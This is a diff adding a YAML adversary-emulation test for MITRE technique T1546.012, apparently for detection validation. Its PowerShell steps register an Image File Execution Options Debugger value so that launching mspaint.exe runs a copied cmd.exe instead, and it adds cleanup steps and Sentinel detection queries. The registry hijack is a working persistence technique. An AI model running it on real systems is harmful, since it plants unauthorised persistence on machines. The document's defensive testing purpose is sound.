@@ -1,0 +1,93 @@
+id: T1546.012_event_triggered_execution_ifeo_injection
+name: "Event Triggered Execution — Image File Execution Options Injection"
+mitre_technique: "T1546.012"
+mitre_tactic: "persistence"
+description: >
+  Adversaries add a Debugger value to the Image File Execution Options (IFEO) registry
+  key for a target process. When Windows launches a process whose name matches an IFEO
+  key with a Debugger value, it launches the debugger binary instead, passing the
+  original binary's path as an argument. This redirects execution: attackers target
+  frequently-launched processes (mspaint.exe, calc.exe, notepad.exe) to trigger their
+  payload. Unlike the accessibility backdoor variant (T1546.008), any process can be
+  targeted — not just pre-logon accessibility binaries.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1546/012/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1546.012 — IFEO Debugger Injection persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Register IFEO debugger for a target process — hijacks every launch"
+    command: |
+      $payload     = "$env:TEMP\PAS_T1546_012_payload.exe"
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $payload -Force
+
+      $ifeoKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe"
+      New-Item -Path $ifeoKey -Force | Out-Null
+      Set-ItemProperty $ifeoKey -Name "Debugger" -Value $payload -Type String
+
+      Write-Host "[PAS] IFEO debugger set: mspaint.exe -> $payload"
+      Write-Host "[PAS] Every mspaint.exe launch now triggers: $payload"
+      Write-Host "[PAS] Trigger: user opens Paint, attaches image, scheduled task, etc."
+
+  - step: 3
+    type: exec_powershell
+    description: "Demonstrate the IFEO redirect — launch mspaint to trigger payload"
+    command: |
+      Write-Host "[PAS] Launching mspaint.exe to demonstrate IFEO redirect:"
+      $proc = Start-Process mspaint.exe -PassThru -ErrorAction SilentlyContinue
+      Start-Sleep -Milliseconds 800
+      if ($proc -and -not $proc.HasExited) {
+          $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+      }
+      Write-Host "[PAS] mspaint.exe launch triggered IFEO redirect to payload"
+
+  - step: 4
+    type: exec_powershell
+    description: "Also set GlobalFlag for silent process exit monitoring (advanced IFEO)"
+    command: |
+      Write-Host "[PAS] Advanced IFEO — GlobalFlag for silent process monitoring:"
+      Write-Host "[PAS] Real attack: set GlobalFlag=512 + MonitorProcess to run arbitrary binary"
+      Write-Host "[PAS] on ANY process exit — not just on launch"
+      Write-Host "[PAS] Detection: GlobalFlag + MonitorProcess values in IFEO key"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Debugger value set under HKLM\\...\\Image File Execution Options\\*.exe"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove IFEO debugger entry and payload"
+    command: |
+      Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" `
+          -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1546_012_payload.exe" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] IFEO debugger entry removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1546.012 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: Debugger value set under HKLM\\...\\Image File Execution Options\\*.exe"
+  - "Process event: target process (mspaint.exe) spawning unexpected child (cmd.exe, powershell.exe)"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Image File Execution Options' and RegistryValueName == 'Debugger'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Image File Execution Options' and RegistryValueData !contains 'vsdbg' and RegistryValueData !contains 'vsjitdebugger'"
+  - "MDE alert: 'IFEO debugger set for persistence or privilege escalation'"
+  - "CONTROL CHECK: All IFEO Debugger values should be developer debuggers (Visual Studio) on developer machines only"
+  - "CONTROL CHECK: Autoruns shows IFEO entries — baseline and alert on any new entry"
